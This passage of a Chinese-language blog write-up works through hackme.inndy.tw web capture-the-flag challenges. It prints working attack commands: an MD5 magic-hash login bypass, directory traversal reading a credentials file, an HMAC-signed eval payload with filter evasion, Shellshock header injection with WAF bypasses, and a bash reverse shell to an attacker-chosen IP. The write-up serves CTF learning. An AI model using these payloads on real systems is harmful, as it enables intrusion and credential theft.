src="https://i.imgur.com/X8jzhT4.png" alt=""><br>会登入失败<br>但我们并不知道$password 是什么<br>这个应该包含的config.php中<br><img src="https://i.imgur.com/ceXi9hm.png" alt=""><br>那该怎么办呢？<br>我们只要用一个工具使得能够不跳转就直接看到后面的flag<br>这里我们使用curl<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl  -d &apos;name=damin&apos; https://hackme.inndy.tw/login4/</span><br></pre></td></tr></table></figure></p><h3 id="13-login-as-admin-6"><a href="#13-login-as-admin-6" class="headerlink" title="13.login as admin 6"></a>13.login as admin 6</h3><p>看看源码<br><img src="https://i.imgur.com/xhQIW6V.png" alt=""><br>这里依旧是要满足<br>$user == ‘admin’<br><img src="https://i.imgur.com/pq71E0H.png" alt=""><br>一看到extrat函数<br>立马想能不能使用变量覆盖呢？<br>并且貌似strcmp($users[$username], $password) == 0)<br>里面函数变量是可控的，能不能尝试命令执行呢？<br>首先是变量覆盖<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl  -d &apos;data=&#123;&quot;user&quot;: &quot;admin&quot;&#125;&apos; https://hackme.inndy.tw/login6/</span><br></pre></td></tr></table></figure></p><p>得到flag<br>其次我们尝试下能不能执行命令<br>构造<br>data = {“username”:”eval(‘echo 1;’);”}试试<br>貌似不可以<br>data = {“username”:”eval(‘phpinfo();’);”}试试<br>貌似不可以<br>本地测试下<br><img src="https://i.imgur.com/ARAmxYX.png" alt=""><br>好吧的确不行<br>必须要<br><img src="https://i.imgur.com/zPM5fKH.png" alt=""><br>这样才可以，记错了</p><h3 id="14-login-as-admin-7"><a href="#14-login-as-admin-7" class="headerlink" title="14.login as admin 7"></a>14.login as admin 7</h3><p>看源码<br><img src="https://i.imgur.com/lQQtPt1.png" alt=""><br>又是需要$user === ‘admin’<br><img src="https://i.imgur.com/w5vRrVH.png" alt=""><br>乍一看感觉有两种写法<br>一种就是md5为0e开头的<br>一种是password[]xxx<br>先试试第一种<br>查下谷歌看下0e开头有哪些，随便找几个</p><blockquote><p>QNKCDZO<br>0e830400451993494058024219903391</p></blockquote><blockquote><p>s878926199a<br>0e545993274517709034328855841020</p></blockquote><blockquote><p>s155964671a<br>0e342768416822451524974117254469</p></blockquote><blockquote><p>s214587387a<br>0e848240448830537924465865611904</p></blockquote><p>貌似一次就成功了<br>payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl  -d &quot;name=admin&amp;password=QNKCDZO&quot; https://hackme.inndy.tw/login7/</span><br></pre></td></tr></table></figure></p><p>试试第二种<br>貌似不可以，应该是MD5函数遇到[]直接返回false了</p><h3 id="15-login-as-admin-8"><a href="#15-login-as-admin-8" class="headerlink" title="15.login as admin 8"></a>15.login as admin 8</h3><p>看看源码<br><img src="https://i.imgur.com/Eo1WbAl.png" alt=""><br>貌似要满足<br>$_POST[‘name’] ！== ‘admin’<br>并且$session-&gt;is_admin<br>从上往下看<br><img src="https://i.imgur.com/CkDdW1h.png" alt=""><br>这边都是调用了Session.php的方法，我们貌似不能看到Session.php的源码这就很难受了<br>暂时没想到要怎么样<br>抓包试试看有没有提示，发现<br><img src="https://i.imgur.com/3EYEggR.png" alt=""><br>把login8cookie中b=0,改成b=1<br>貌似不行，<br>login8sha512拿去解密下<br>额，还是不行<br>嗯，我才login8sha512是login8直接sha512加密试试把b=1的也拿加密试试<br>不行的话估计就没办法了<br>额，不行<br>试试直接用url的加密看看<br>还是失败<br>这就很神奇了，按道理是可以的<br>把原先的的cookie 512加密后，额居然是不一样的。。。</p><h3 id="16-login-as-admin-8-1"><a href="#16-login-as-admin-8-1" class="headerlink" title="16.login as admin 8.1"></a>16.login as admin 8.1</h3><p>不想写login as admin.jpg<br>goole了下，发现一个老哥有写,需要的直接看把</p><blockquote><p><a href="https://www.jianshu.com/p/6ef727966153" target="_blank" rel="noopener">https://www.jianshu.com/p/6ef727966153</a></p></blockquote><h3 id="17-dafuq-manager-1"><a href="#17-dafuq-manager-1" class="headerlink" title="17.    dafuq-manager 1"></a>17.    dafuq-manager 1</h3><p>不想写 Login as guest.png<br>算了还是写吧<br><img src="https://i.imgur.com/fUjyh1I.png" alt=""><br>提示使用 guest guest登入<br><img src="https://i.imgur.com/5HqO3M9.png" alt=""><br>Do you know cookie? Create a cookie named <code>help</code> with value <code>me</code>!<br><img src="https://i.imgur.com/RNDy0hC.png" alt=""></p><p>很可疑阿，改成yes<br>得到flag</p><h3 id="18-dafuq-manager-2"><a href="#18-dafuq-manager-2" class="headerlink" title="18.    dafuq-manager 2"></a>18.    dafuq-manager 2</h3><p>这题叫我们用admin进入<br>先 guest guest进入<br><img src="https://i.imgur.com/lcOzYLt.png" alt=""><br>下载源码<br>先看看index.php<br>发现<br><img src="https://i.imgur.com/RSb92f2.png" alt=""><br>继续跟进<br><img src="https://i.imgur.com/BADXyTr.png" alt=""><br>admin需要满足<br><img src="https://i.imgur.com/YJr2kYV.png" alt=""><br>搜下<br><img src="https://i.imgur.com/HumhOH8.png" alt=""><br>发现$GLOBALS[“permissions”]来自func_user<br>而data[6]又来自$data<br>$data又与find_user有关<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function &amp;find_user($user, $pass) &#123;</span><br><span class="line">    $cnt = count($GLOBALS[&quot;users&quot;]);</span><br><span class="line">    for ($i = 0;$i &lt; $cnt;++$i) &#123;</span><br><span class="line">        if ($user == $GLOBALS[&quot;users&quot;][$i][0]) &#123;</span><br><span class="line">            if ($pass == NULL || ($pass == $GLOBALS[&quot;users&quot;][$i][1] &amp;&amp; $GLOBALS[&quot;users&quot;][$i][7])) &#123;</span><br><span class="line">                return $GLOBALS[&quot;users&quot;][$i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return NULL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>即为$GLOBALS[“users”][6];<br>和/.config/.htusers.php有关<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$GLOBALS[&quot;users&quot;] = array(</span><br><span class="line">    array(&quot;guest&quot;, &quot;084e0343a0486ff05530df6c705c8bb4&quot;, &quot;./data/guest&quot;, &quot;https://game1.security.ntu.st/data/guest&quot;, 0, &quot;^.ht&quot;, 1, 1),</span><br><span class="line">);</span><br></pre></td></tr></table></figure></p><p>有关,但是源码泄露并没有泄露全只给出了guest的密码，这里应该是有管理员账号密码的，账号密码存在文件中所以我们不能够sql注入<br>看看有没有什么文件读取的/.config/.htusers.php的<br>读取文件函数</p><blockquote><p>fread<br>file_get_contents<br>fopen<br>file_arr<br>fgets<br>include<br>require<br>readfile</p></blockquote><p>在seay中进行自动审计<br><img src="https://i.imgur.com/PZ1K584.png" alt=""><br>fun_down有readfile<br>![](<a href="https://i.imgur.com/bAS6S9G.png" target="_blank" rel="noopener">https://i.imgur.com/bAS6S9G.png</a><br>但是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (!file_in_web($abs_item) || stristr($abs_item, &apos;.php&apos;) || stristr($abs_item, &apos;config&apos;)) show_error($item . &quot;: &quot; . $GLOBALS[&quot;error_msg&quot;][&quot;accessfile&quot;]);</span><br></pre></td></tr></table></figure></p><p>过滤的是否严密，把config，php都过滤了，看看还有没有什么地方可以读取的<br>我们看看第六条/core/fun_edit.php<br><img src="https://i.imgur.com/eAWnZwB.png" alt=""><br>前面两个条件第一个我们在<br>.htusers.php中可以看出这项是对的<br>第二个条件是也是符合的<br>看看<br><img src="https://i.imgur.com/eF3gL6H.png" alt=""><br>只有一个简单的过滤我们随便就可以过了<br>所以我们构造目录穿梭进行读取<br>payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://dafuq-manager.hackme.inndy.tw/index.php?action=edit&amp;item=</span><br><span class="line">/../../../../../../var/www/webhdisk/.config/.htusers.php</span><br></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/vkh2zJc.png" alt=""><br>md5解码后登入得到flag</p><h3 id="19-dafuq-manager-3"><a href="#19-dafuq-manager-3" class="headerlink" title="19.dafuq-manager 3"></a>19.dafuq-manager 3</h3><p>还是这题，<br>审计不动.jpg<br>mmp<br>题目叫我们get-shell<br>上题就注意这个eval了<br><img src="https://i.imgur.com/5Bre5Xj.png" alt=""><br>这题看下可不可以利用<br><img src="https://i.imgur.com/buLS911.png" alt=""><br>很明显要通过这个hash_equals的判断<br>耿总下cmd以及hmac看看<br>发现是源于<img src="https://i.imgur.com/hyOwRmW.png" alt=""><br>我们可以控制cmd以及hmac的值<br>但是必须满足<br>hash_hmac(‘sha256’, $cmd, $GLOBALS[“secret_key”]）<br>也就是说我们还需要知道 $GLOBALS[“secret_key”]是怎么来的<br>在/.config/conf.php文件中我们获取到了<br>$GLOBALS[“secret_key”] = ‘KHomg4WfVeJNj9q5HFcWr5kc8XzE4PyzB8brEw6pQQyzmIZuRBbwDU7UE6jYjPm3’;<br>$GLOBALS[“secret_key”]的值<br>也就是说我们已经可以构造cmd命令进行命令执行了<br>但是<br><img src="https://i.imgur.com/dMWZdPy.png" alt=""><br><img src="https://i.imgur.com/UGmTBKE.png" alt=""><br>直接dir[]绕过<br>这里显示对cmd进行base64解码，然后进行waf过滤<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&apos;system&apos;, &apos;exec&apos;, &apos;popen&apos;, </span><br><span class="line">&apos;pcntl_exec&apos;, &apos;proc_open&apos;, </span><br><span class="line">&apos;passthru&apos;, &apos;`&apos;, &apos;eval&apos;, </span><br><span class="line">&apos;assert&apos;, &apos;preg_replace&apos;, </span><br><span class="line">&apos;create_function&apos;, &apos;include&apos;,</span><br><span class="line">&apos;require&apos;, &apos;curl&apos;</span><br></pre></td></tr></table></figure></p><p>可以使用拼接的方法进行绕过<br>具体看</p><blockquote><p><a href="https://chybeta.github.io/2017/08/15/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/" target="_blank" rel="noopener">https://chybeta.github.io/2017/08/15/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/</a></p></blockquote><p>先echo 1；下看下行不行<br>payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$cmd=&apos;$a=\&apos;ass\&apos;;$b=\&apos;ert\&apos;;$c=$a.$b;$c(base64_decode(\&apos;c3lzdGVtKCdscycp\&apos;));&apos;;</span><br><span class="line">$hash=&apos;KHomg4WfVeJNj9q5HFcWr5kc8XzE4PyzB8brEw6pQQyzmIZuRBbwDU7UE6jYjPm3&apos;;</span><br><span class="line">$hmac=hash_hmac(&apos;sha256&apos;, $cmd, $hash);</span><br><span class="line">echo sprintf(&apos;%s.%s&apos;, base64_encode($cmd), $hmac</span><br></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/SJTpKbU.png" alt=""><br>啥意思<br>嗯，可能要读取下flag3?<br>cat flag3<br>啥都没有<br>执行下<br>./flag3<br>没反应<br>这可能是个文件夹<br>cd flag3; ls试试<br><img src="https://i.imgur.com/DtuLg7P.png" alt=""><br>再执行下<br>./flag3/flag3<br>没反应<br>看到meow 这个应该是个编译好的c文件<br>执行下<br>./flag3/meow flag We have cat to read file, And the meow to cat flag.<br>应该是两个都要执行<br>system(‘./flag3/meow ./flag3/flag3’)<br>flag出来了</p><h3 id="20-wordpress-1"><a href="#20-wordpress-1" class="headerlink" title="20.wordpress 1"></a>20.wordpress 1</h3><p>看了下提示<br>Something strange is hidding in the source code<br>这大概是用 wordpress搭建的博客，我自己使用的是hexo<br>看看源码，没有什么特殊发现，看看有没有源码泄露<br>打开robots.txt没有<br>看看博客文章<br>在第一篇文章里发现源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.dropbox.com/s/r5fk52thwh79kzw/web-security-course-game2.7z?dl=0</span><br></pre></td></tr></table></figure></p><p>把源码下载下来</p><blockquote><p><a href="https://www.dropbox.com/h" target="_blank" rel="noopener">https://www.dropbox.com/h</a></p></blockquote><p>这个网站貌似挺好的，不过存储只有2G，太少了<br>自动审计+搜索下flag，发现一大堆…<br>mmp这可能要审成sb了<br>一般来说这种完整的网站，插件是一个漏洞很可能存在的地方<br><img src="https://i.imgur.com/LOGowLr.png" alt=""><br><img src="https://i.imgur.com/fbb5tmJ.png" alt=""><br>这一串sprintf是什么鬼<br>哦<br><img src="https://i.imgur.com/LbPiMsm.png" alt=""><br>试试看password[]能不能绕过<br>不能<br>只能拿去破解了<br><img src="https://i.imgur.com/FdhOBvM.png" alt=""></p><blockquote><p>吐槽下cMD5还是什么都要收费（）我刚刚使用的md5解密的平台chamd5</p></blockquote><p><img src="https://i.imgur.com/OX5JV0I.png" alt=""><br>跟进<br><img src="https://i.imgur.com/UD2y2yU.png" alt=""><br>直接x-forword-for 127.0.0.1<br>出来了</p><h3 id="21-wordpress-1"><a href="#21-wordpress-1" class="headerlink" title="21.wordpress 1"></a>21.wordpress 1</h3><p><img src="https://i.imgur.com/8zSWBBR.png" alt=""></p><p>上一题就注意到了<br><img src="https://i.imgur.com/Y83jQAl.png" alt=""><br>难道是第一题的flag输入进去吗？<br>好吧想多了，可能是要通过某个后门进入<br>在源码处发现，别问我怎么找到问就648<br><img src="https://i.imgur.com/4e4LZAa.png" alt=""><br>大概意思是通过post某个值获取这个值的内容？<br>嗯，文件时Seach，这大概也要search下吧</p><blockquote><p>view-source:<a href="https://wp.hackme.inndy.tw/page/2?s=&amp;debug=title" target="_blank" rel="noopener">https://wp.hackme.inndy.tw/page/2?s=&amp;debug=title</a></p></blockquote><p><img src="https://i.imgur.com/7GbcWoX.png" alt=""><br>于是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s=&amp;debug=content</span><br></pre></td></tr></table></figure></p><p>得到flag</p><h3 id="22-webshell"><a href="#22-webshell" class="headerlink" title="22 .webshell"></a>22 .webshell</h3><p>一进去502</p><blockquote><p>a padding to disable MSIE and Chrome friendly error page</p></blockquote><p>换下火狐试试<br>怎么肥事，还是不行<br>只能跳过这题了</p><h3 id="23-command-executor"><a href="#23-command-executor" class="headerlink" title="23.command-executor"></a>23.command-executor</h3><p>这题有点叼<br>跟着大佬的wp做做吧<br>进入<br>随意点点，在List files发现func与下面的php文件名字相同<br>疑似有文件包含漏洞，使用php伪协议看看能不能读取文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=index</span><br></pre></td></tr></table></figure></p><p>得到index源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$pages = [</span><br><span class="line">    [&apos;man&apos;, &apos;Man&apos;],</span><br><span class="line">    [&apos;untar&apos;, &apos;Tar Tester&apos;],</span><br><span class="line">    [&apos;cmd&apos;, &apos;Cmd Exec&apos;],</span><br><span class="line">    [&apos;ls&apos;, &apos;List files&apos;],</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">function fuck($msg) &#123;</span><br><span class="line">    header(&apos;Content-Type: text/plain&apos;);</span><br><span class="line">    echo $msg;</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$black_list = [</span><br><span class="line">    &apos;\/flag&apos;, &apos;\(\)\s*\&#123;\s*:;\s*\&#125;;&apos;</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">function waf($a) &#123;</span><br><span class="line">    global $black_list;</span><br><span class="line">    if(is_array($a)) &#123;</span><br><span class="line">        foreach($a as $key =&gt; $val) &#123;</span><br><span class="line">            waf($key);</span><br><span class="line">            waf($val);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        foreach($black_list as $b) &#123;</span><br><span class="line">            if(preg_match(&quot;/$b/&quot;, $a) === 1) &#123;</span><br><span class="line">                fuck(&quot;$b detected! exit now.&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">waf($_SERVER);</span><br><span class="line">waf($_GET);</span><br><span class="line">waf($_POST);</span><br><span class="line"></span><br><span class="line">function execute($cmd, $shell=&apos;bash&apos;) &#123;</span><br><span class="line">    system(sprintf(&apos;%s -c %s&apos;, $shell, escapeshellarg($cmd)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foreach($_SERVER as $key =&gt; $val) &#123;</span><br><span class="line">    if(substr($key, 0, 5) === &apos;HTTP_&apos;) &#123;</span><br><span class="line">        putenv(&quot;$key=$val&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$page = &apos;&apos;;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&apos;func&apos;])) &#123;</span><br><span class="line">    $page = $_GET[&apos;func&apos;];</span><br><span class="line">    if(strstr($page, &apos;..&apos;) !== false) &#123;</span><br><span class="line">        $page = &apos;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if($page &amp;&amp; strlen($page) &gt; 0) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        include(&quot;$page.php&quot;);</span><br><span class="line">    &#125; catch (Exception $e) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function render_default() &#123; ?&gt;</span><br><span class="line">&lt;p&gt;Welcome to use our developer assistant service. We provide servial useless features to make your developing life harder.&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">&lt;img src=&quot;windows-run.jpg&quot; alt=&quot;command executor&quot;&gt;</span><br><span class="line">&lt;?php &#125;</span><br><span class="line">?&gt;&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;Command Executor&lt;/title&gt;</span><br><span class="line">    &lt;link rel=&quot;stylesheet&quot; href=&quot;bootstrap/css/bootstrap.min.css&quot; media=&quot;all&quot;&gt;</span><br><span class="line">    &lt;link rel=&quot;stylesheet&quot; href=&quot;comic-neue/font.css&quot; media=&quot;all&quot;&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">      nav &#123; margin-bottom: 1rem; &#125;</span><br><span class="line">      img &#123; max-width: 100%; &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;nav class=&quot;navbar navbar-expand-lg navbar-dark bg-dark d-flex&quot;&gt;</span><br><span class="line">      &lt;a class=&quot;navbar-brand&quot; href=&quot;index.php&quot;&gt;Command Executor&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">      &lt;ul class=&quot;navbar-nav&quot;&gt;</span><br><span class="line">&lt;?php foreach($pages as list($file, $title)): ?&gt;</span><br><span class="line">        &lt;li class=&quot;nav-item&quot;&gt;</span><br><span class="line">          &lt;a class=&quot;nav-link&quot; href=&quot;index.php?func=&lt;?=$file?&gt;&quot;&gt;&lt;?=$title?&gt;&lt;/a&gt;</span><br><span class="line">        &lt;/li&gt;</span><br><span class="line">&lt;?php endforeach; ?&gt;</span><br><span class="line">      &lt;/ul&gt;</span><br><span class="line">    &lt;/nav&gt;</span><br><span class="line"></span><br><span class="line">    &lt;div class=&quot;container&quot;&gt;&lt;?php if(is_callable(&apos;render&apos;)) render(); else render_default(); ?&gt;&lt;/div&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>发现可疑函数putenv<br>这里与14年的破壳漏洞有关</p><blockquote><p>●发布时间:2014-09-25　14时48分04秒<br>●CVE ID:CVE-2014-6271<br>●受影响版本:</p></blockquote><p>具体可以看</p><blockquote><p><a href="https://www.freebuf.com/articles/system/45390.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/45390.html</a></p></blockquote><p>google<br>可以发现</p><blockquote><p><a href="https://security.stackexchange.com/questions/68325/shellshock-attack-scenario-exploiting-php" target="_blank" rel="noopener">https://security.stackexchange.com/questions/68325/shellshock-attack-scenario-exploiting-php</a></p></blockquote><p><img src="https://i.imgur.com/EcXUBAG.png" alt=""></p><p>和我们所要利用的几乎一样<br><img src="https://i.imgur.com/T5uAmTs.png" alt=""><br>尝试使用payload</p><blockquote><p>wget –header=”X-Exploit: () { :; }; echo Hacked” -q -O -  <a href="https://command-executor.hackme.inndy.tw/index.php?func=cmd&amp;cmd=env" target="_blank" rel="noopener">https://command-executor.hackme.inndy.tw/index.php?func=cmd&amp;cmd=env</a></p></blockquote><p>发现被过滤</p><p><img src="https://i.imgur.com/6M5yDFA.png" alt=""><br>查看源码</p><p><img src="https://i.imgur.com/pkPYbsE.png" alt=""><br>waf是由正则进行匹配，这种waf非常不安全<br>只要将：；中间加个空格就可以绕过<br>payload如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget --header=&quot;X-Exploit: () &#123; : ; &#125;; echo Hacked&quot; -q -O -  https://command-executor.hackme.inndy.tw/index.php?func=cmd&amp;cmd=env|grep Hacked</span><br></pre></td></tr></table></figure></p><p>得到回显<br>通过之前目录穿梭<br>../../../<br>可以发现flag<br><img src="https://i.imgur.com/g99DGuY.png" alt=""><br>也就是说我们要读取这个flag<br>发现我们被waf过滤了<br><img src="https://i.imgur.com/qKmQXts.png" alt=""><br>这里有两种方式绕过</p><blockquote><p>1.拼接方式<br>2.通配符</p></blockquote><blockquote><p>wget –header=”X-Exploit: () { : ; }; /bin/cat ../../../../../../?lag” -q -O - “<a href="https://command-executor.hackme.inndy.tw/index.php?func=cmd&amp;cmd=env&quot;" target="_blank" rel="noopener">https://command-executor.hackme.inndy.tw/index.php?func=cmd&amp;cmd=env&quot;</a></p></blockquote><p>使用通配符进行代替f字母，我们成功绕过waf<br>但是flag文件需要root权限才能进行读取，<br>而flag下面flag-reader这个c文件很可疑<br>我们进行读取</p><blockquote><p>wget –header=”X-Exploit: () { : ; }; /bin/cat ../../../../../../?lag-reader.c” -q -O - “<a href="https://command-executor.hackme.inndy.tw/index.php?func=cmd&amp;cmd=env&quot;" target="_blank" rel="noopener">https://command-executor.hackme.inndy.tw/index.php?func=cmd&amp;cmd=env&quot;</a></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;syscall.h&gt;</span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">int main(int argc, char *argv[])</span><br><span class="line">&#123;</span><br><span class="line">    char buff[4096], rnd[16], val[16];</span><br><span class="line">    if(syscall(SYS_getrandom, &amp;rnd, sizeof(rnd), 0) != sizeof(rnd)) &#123;</span><br><span class="line">        write(1, &quot;Not enough random\n&quot;, 18);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    setuid(1337);</span><br><span class="line">    seteuid(1337);</span><br><span class="line">    alarm(1);</span><br><span class="line">    write(1, &amp;rnd, sizeof(rnd));</span><br><span class="line">    read(0, &amp;val, sizeof(val));</span><br><span class="line"></span><br><span class="line">    if(memcmp(rnd, val, sizeof(rnd)) == 0) &#123;</span><br><span class="line">        int fd = open(argv[1], O_RDONLY);</span><br><span class="line">        if(fd &gt; 0) &#123;</span><br><span class="line">            int s = read(fd, buff, 1024);</span><br><span class="line">            if(s &gt; 0) &#123;</span><br><span class="line">                write(1, buff, s);</span><br><span class="line">            &#125;</span><br><span class="line">            close(fd);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            write(1, &quot;Can not open file\n&quot;, 18);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        write(1, &quot;Wrong response\n&quot;, 16);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>大致1秒之内把他输出的再输入回去，就可以打出文件内容<br>此时我们的思路很简单，运行这个c<br>算了，直接拿shell好了<br>shell反弹<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget --header=&quot;X-Exploit: () &#123; : ; &#125;; /bin/bash -i &gt;&amp; /dev/tcp/你的ip/8888 0&gt;&amp;1&quot; -q -O - &quot;https://command-executor.hackme.inndy.tw/index.php?func=cmd&amp;cmd=env&quot;</span><br></pre></td></tr></table></figure></p><p>选择了linux下的重定向，我们将输出写到某个文件中，再自动输入即可，这样即可达到目的<br>我们先去探索可写目录，容易发现/var/tmp具有写权限<br>直接<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag-reader flag &gt; /var/tmp/skyflag &lt; /var/tmp/skyflag</span><br></pre></td></tr></table></figure></p><p>然后cat /var/tmp/skyflag就可以得到flag了</p><h3 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h3><blockquote><p><a href="http://www.northity.com/2018/10/23/XSSme%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/" target="_blank" rel="noopener">http://www.northity.com/2018/10/23/XSSme%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/</a></p></blockquote><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote><p><a 